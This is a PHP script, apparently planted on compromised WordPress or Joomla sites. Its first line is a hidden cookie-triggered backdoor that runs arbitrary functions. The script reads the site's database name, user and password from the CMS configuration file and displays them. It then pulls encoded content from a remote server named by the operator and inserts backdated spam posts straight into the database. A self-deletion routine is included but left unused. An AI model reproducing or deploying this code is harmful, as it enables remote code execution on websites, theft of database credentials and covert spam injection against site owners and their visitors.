<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


class SetLink {

    public $docRoot;

    public $domain;

    public $configFile;

    public $jmFileConfig = '/configuration.php';

    public $wpFileConfig = '/wp-config.php';

    public $cms;

    public $dbParameters;

    public $titlePost;

    public $contentPost;

    public $connection;

    protected $url;

    protected $key;


    public function __construct()
    {

        $this->docRoot = getcwd();

        $this->domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);

        if(file_exists($this->docRoot . $this->wpFileConfig))
        {
            $this->cms = 'wp';
        }elseif(file_exists($this->docRoot . $this->jmFileConfig)){

            $this->cms = 'jm';
        }else{
            echo '<p class="error">Can\'t define cms!!!</p>';
            exit;
        }

    }

    public function getDbData()
    {
        switch($this->cms){
            case 'wp':
                $file = file_get_contents($this->docRoot . $this->wpFileConfig);

                preg_match_all( '/define\s*?\(\s*?([\'"])(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|DB_CHARSET)\1\s*?,\s*?([\'"])([^\3]*?)\3\s*?\)\s*?;/si', $file, $defines );
                if ( ( isset( $defines[ 2 ] ) && ! empty( $defines[ 2 ] ) ) && ( isset( $defines[ 4 ] ) && ! empty( $defines[ 4 ] ) ) ) {
                    foreach( $defines[ 2 ] as $key => $define ) {

                        switch( $define ) {
                            case 'DB_NAME':
                                $this->dbParameters['DB_NAME'] = $defines[ 4 ][ $key ];
                                break;
                            case 'DB_USER':
                                $this->dbParameters['DB_USER'] = $defines[ 4 ][ $key ];
                                break;
                            case 'DB_PASSWORD':
                                $this->dbParameters['DB_PASSWORD'] = $defines[ 4 ][ $key ];
                                break;
                            case 'DB_HOST':
                                $this->dbParameters['DB_HOST'] = $defines[ 4 ][ $key ];
                                break;
                            case 'DB_CHARSET':
                                $this->dbParameters['DB_CHARSET'] = $defines[ 4 ][ $key ];
                                break;
                        }

                        preg_match('/table_prefix  = \'(.*?)\';/si', $file, $matches);
                        if(!empty($matches['1'])){
                            $this->dbParameters['DB_PREFIX'] = $matches['1'];
                        }else{
                            die('<p class="error">Can\'t get DB data!!!</p>');
                        }
                    }
                }else{
                    die('<p class="error">Can\'t get DB data!!!</p>');
                }


                break;

            case 'jm':

                include_once($this->docRoot . $this->jmFileConfig);

                $db = new JConfig();
                $this->dbParameters['DB_NAME'] = $db->db;
                $this->dbParameters['DB_USER'] = $db->user;
                $this->dbParameters['DB_PASSWORD'] = $db->password;
                $this->dbParameters['DB_HOST'] = $db->host;
                $this->dbParameters['DB_CHARSET'] = 'utf-8';
                $this->dbParameters['DB_PREFIX'] = $db->dbprefix;

                if(empty($this->dbParameters['DB_NAME'])){
                    die('<p class="error">Can\'t get DB data!!!</p>');
                }

                break;
        }

        if(empty($this->dbParameters['DB_NAME'])){
            die('<p class="error">Can\'t get DB data!!!</p>');
        }

        return $this->dbParameters;

    }



    public function DbConnect()
    {
        if($connection = mysql_connect($this->dbParameters['DB_HOST'],$this->dbParameters['DB_USER'],$this->dbParameters['DB_PASSWORD']))
        {
            mysql_select_db($this->dbParameters['DB_NAME'], $connection);
            return $connection;
        }else{
            return false;
        }
    }


    public function setLinksToDbJm()
    {
        if(empty($_POST['url']) || empty($_POST['key'])){
            die('<p class="error">Some of your field is empty!!!</p>');
        }

        if($keys = $this->getKeys()){


            $result = explode('{{beginContent}}', $keys['content']);

            $this->titlePost = $result[0];

            $this->contentPost = $result[1];


            if(!empty($this->titlePost)){
                $link = trim($this->titlePost);
                $link = str_replace(' ', '-', strtolower($link));
                $link = preg_replace('/[^A-Za-z0-9-]/', '-', $link);
            }else{
                $link = 'post-slug';
            }

            $timeRand = rand(4,12) * rand(30,31);
            $timeCurrent = date('Y-m-d', (strtotime('now') - (60*60*24 * $timeRand)));

            $sql = 'INSERT INTO '.$this->dbParameters['DB_PREFIX'].'content(
                      title,alias,introtext, '.$this->dbParameters['DB_PREFIX'].'content.fulltext,state,catid,created,created_by,
                      created_by_alias,modified,modified_by,checked_out,checked_out_time,publish_up,
                      publish_down,images,urls,attribs,version,ordering,metakey,metadesc,access,
                      hits,metadata,featured,language,xreference)
                    VALUES (\''.addslashes($this->titlePost).'\',\''.$link.'\',\''.addslashes($this->contentPost).'\',\'\',\'1\',
                      \'\',\''.$timeCurrent.'\',\'\',\'\',\'\',\'0\',\'0\',\'\',\'\',\'\',\'{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}\',
                      \'{"urla":false,"urlatext":"","targeta":"","urlb":false,"urlbtext":"","targetb":"","urlc":false,"urlctext":"","targetc":""}\',
                      \'{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}\',
                      \'1\',\'0\',\'\',\'\',\'1\',\'1\',\'{"robots":"","author":"","rights":"","xreference":""}\',
                      \'0\',\'*\',\'\')';

            if(mysql_query($sql, $this->connection))
            {

                $idPost = mysql_insert_id();

                echo '<p class="success">Yahhhhoooooo, all done!!!</p>
                        <p><strong>Link:</strong></strong></p>
                        <p>http://'.$_SERVER['HTTP_HOST'].'/index.php?option=com_content&view=article&id='.$idPost.'</p>
                        <p><strong>Alias:</strong></strong></p>
                        <p>http://'.$_SERVER['HTTP_HOST'].'/'.$link.'/</p>
                    ';
                $this->getKeys(array(
                    'link' => 'http://'.$_SERVER['HTTP_HOST'].'/index.php?option=com_content&view=article&id='.$idPost,
                    'file' => $keys['file'],
                    'status' => true,
                    'alias'  => 'http://' . $_SERVER['HTTP_HOST'] . '/' .$link . '/'
                ));
                //$this->unsetMe();
            }else{
                $this->getKeys(array(
                    'link' => 'http://' . $_SERVER['HTTP_HOST'] . '/' .$link . '/',
                    'file' => $keys['file'],
                    'alias'  => 'http://' . $_SERVER['HTTP_HOST'] . '/' .$link . '/',
                    'status' => false
                ));
                die('<p class="error">Sorry but we cant add data to DB!!!</p>');
            }

        }else{
            $this->getKeys(array(
                'link' => 'http://' . $_SERVER['HTTP_HOST'] . '/empty-link/',
                'file' => 'empty-file',
                'alias'  => 'http://' . $_SERVER['HTTP_HOST'] . '/empty-alias/',
                'status' => false
            ));

            die('<p class="error">Sorry, but ve get empty content from server!!!</p>');
        }
    }
    public function setLinksToDbWp()
    {

        if(empty($_POST['url']) || empty($_POST['key'])){
            die('<p class="error">Some of your field is empty!!!</p>');
        }

        if($keys = $this->getKeys()){


            $result = explode('{{beginContent}}', $keys['content']);

            $this->titlePost = $result[0];

            $this->contentPost = $result[1];


            if(!empty($this->titlePost)){
                $link = trim($this->titlePost);
                $link = str_replace(' ', '-', strtolower($link));
                $link = preg_replace('/[^A-Za-z0-9-]/', '-', $link);
            }else{
                $link = 'post-slug';
            }

            $timeRand = rand(4,12) * rand(30,31);
            $timeCurrent['year'] = date('Y', (strtotime('now') - (60*60*24 * $timeRand)));
            $timeCurrent['month'] = date('m', (strtotime('now') - (60*60*24 * $timeRand)));
            $timeCurrent['day'] = date('d', (strtotime('now') - (60*60*24 * $timeRand)));

            $needTime = implode('-', $timeCurrent) . ' 00:00:00';

            $sql = "INSERT INTO " . $this->dbParameters['DB_PREFIX'] ."posts  (post_author,
                post_date,post_date_gmt,post_content,post_title,post_excerpt,
                post_status,comment_status,ping_status,post_password,post_name,
                to_ping,pinged,post_modified,post_modified_gmt,post_content_filtered,
                post_parent,guid,menu_order,post_type,post_mime_type,comment_count)
            VALUES ('1','".$needTime."','".$needTime."','".addslashes($this->contentPost)."',
                  '".addslashes($this->titlePost)."','','publish','open','open',
                  '','".$link."','','','".$needTime."','".$needTime."',
                  '','0','','0','post','','0')";

            if(mysql_query($sql, $this->connection))
            {
                $idPost = mysql_insert_id();

                if($linkNew = $this->wpPostSlug($timeCurrent, $idPost, $link)){
                    echo '<p class="success">Yahhhhoooooo, all done!!!</p>
                        <p><strong>Link:</strong></strong></p>
                        <p>http://'.$_SERVER['HTTP_HOST'].$linkNew.'</p>
                    ';
                    $this->getKeys(array(
                        'link' => 'http://'.$_SERVER['HTTP_HOST'].$linkNew,
                        'file' => $keys['file'],
                        'status' => true
                    ));
                }else{
                    echo '<p class="success">Yahhhhoooooo, all done!!!</p>
                        <p><strong>Link:</strong></strong></p>
                        <p>http://'.$_SERVER['HTTP_HOST'].'/'.$link.'/</p>
                    ';
                    $this->getKeys(array(
                        'link' => 'http://' . $_SERVER['HTTP_HOST'] . '/' .$link . '/',
                        'file' => $keys['file'],
                        'status' => true
                    ));
                }
                //$this->unsetMe();
            }else{
                $this->getKeys(array(
                    'link' => 'http://' . $_SERVER['HTTP_HOST'] . '/' .$link . '/',
                    'file' => $keys['file'],
                    'status' => false
                ));
                die('<p class="error">Sorry but we cant add data to DB!!!</p>');
            }

        }else{
            $this->getKeys(array(
                'link' => 'http://' . $_SERVER['HTTP_HOST'] . '/empty-link/',
                'file' => 'empty-file',
                'status' => false
            ));
            die('<p class="error">Sorry, but ve get empty content from server!!!</p>');
        }
    }

    public function getKeys($parameters = '')
    {
        $keys = false;

        if(function_exists('curl_init')){

            if(!empty($parameters)){
                $parameters = '&' . http_build_query($parameters);
            }
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $_POST['url'].'/link.php?key='.$_POST['key'].$parameters);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $result = curl_exec($ch);
            curl_close($ch);


            $keys = json_decode(base64_decode($result), true);
            if(empty($keys['content'])){
                return false;
            }

        }else{
            $keys = file_get_contents('http://'.$_POST['url'].'/link.php?key='.$_POST['key'].$parameters);

            if(!empty($keys)){
                $keys = json_decode(base64_decode($keys), true);
            }else{
                return false;
            }

        }
        if(empty($keys['content'])){
            return false;
        }

        return $keys;
    }

    public function unsetMe()
    {
        unlink(__FILE__);
    }

    public function wpPostSlug($date, $postId, $postName)
    {
        $templates = array(
            '%postname%','%post_id%', '%monthnum%', '%year%', '%day%'
        );

        $sql = 'SELECT option_value FROM ' . $this->dbParameters['DB_PREFIX'] . 'options WHERE option_name="permalink_structure" LIMIT 0,1';
        $query = mysql_query($sql, $this->connection);

        if(mysql_num_rows($query) > 0)
        {
            while($row = mysql_fetch_array($query, MYSQL_ASSOC)){

                if(!empty($row['option_value'])){

                    return str_replace($templates, array($postName, $postId, $date['month'], $date['year'], $date['day']), $row['option_value']);

                }else{
                    return '/?p=' . $postId;
                }

            }

        }else{
            return false;
        }
    }
}
?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        .container{border:solid 1px silver;width: 280px;min-height: 200px;margin: 100px auto 0px auto;background: rgb(239, 239, 239);padding: 3px 3px 3px 3px;}
        .error{width: 93%;padding: 10px;background: rgb(245, 116, 116);color: #ffffff;margin: 0px auto 0px auto;}
        .success{width: 93%;padding: 10px;background: rgb(20, 136, 20);color: #ffffff;margin: 0px auto 0px auto;}
        .text-row{font-size: 13px;width: 276px;margin-bottom: 5px}
        .text-row span{display: inline-block;width: 100px}
        .text-row input{width: 100%}
        .text-row .error{width: 260px;margin-top: 3px;padding: 5px 10px 5px 10px;}
        .title{background: rgb(221, 220, 220);font-size: 14px;padding: 5px 0px 5px 2px;cursor: pointer}
        .content{display: none;}
        .content .text-row{padding: 4px 0px 3px 0px;border-bottom: solid 1px silver;}
        .content .text-row:last-child{border-bottom: none;}
        .content .text-row.attention{background: rgb(249, 197, 197);}
    </style>
    <script type="text/javascript" src="//code.jquery.com/jquery-2.1.4.js"></script>
    <script type="text/javascript">
        $(function(){
            $('form').submit(function(){var ch = true;$(this).find('input[data-required="true"]').each(function(){if($(this).val() == ''){$(this).after('<p class="error">Field Can\'t be empty!!!!</p>');ch = false;}});
                if(ch){return true;}else{return false;}});
            $('input[name="cat"]').change(function(){var val = $(this).val();if(val != ''){$(this).val(val.replace(/\//g, ''));}});
            $('input[name="cat"]').keyup(function(){var val = $(this).val();if(val != ''){$(this).val(val.replace(/\//g, ''));}});
            $('.title').click(function(){$(this).next().slideToggle();});

        });
    </script>
</head>
<body>
<div class="container">
    <?php
    $c = new SetLink();
    if(empty($_POST)){
        $c->getDbData();
        ?>
        <div class="text-row"><span>DB_NAME:</span> <input class="text" type="text" disabled value="<?php echo $c->dbParameters['DB_NAME']?>"/></div>
        <div class="text-row"><span>DB_USER:</span> <input class="text" type="text" disabled value="<?php echo $c->dbParameters['DB_USER']?>"/></div>
        <div class="text-row"><span>DB_PASSWORD:</span> <input class="text" type="text" disabled value="<?php echo $c->dbParameters['DB_PASSWORD']?>"/></div>
        <div class="text-row"><span>DB_HOST:</span> <input class="text" type="text" disabled value="<?php echo $c->dbParameters['DB_HOST']?>"/></div>
        <div class="text-row"><span>DB_PREFIX:</span> <input class="text" type="text" disabled value="<?php echo $c->dbParameters['DB_PREFIX']?>"/></div>

        <hr/>
        <form action="" method="post">

            <div class="text-row"><span>URL:</span> <input class="text" type="text" name="url" value="" data-required="true"/></div>
            <div class="text-row"><span>API Key:</span> <input class="text" type="text" name="key" value="" data-required="true"/></div>
            <input type="submit" value="Start"/>

        </form>

    <?php
    }else{
        $c->getDbData();
        $c->connection = $c->DbConnect();
        if($c->cms == 'wp'){
            $c->setLinksToDbWp();
        }else{
            $c->setLinksToDbJm();
        }

    }
    ?>
</div>
</body>
</html>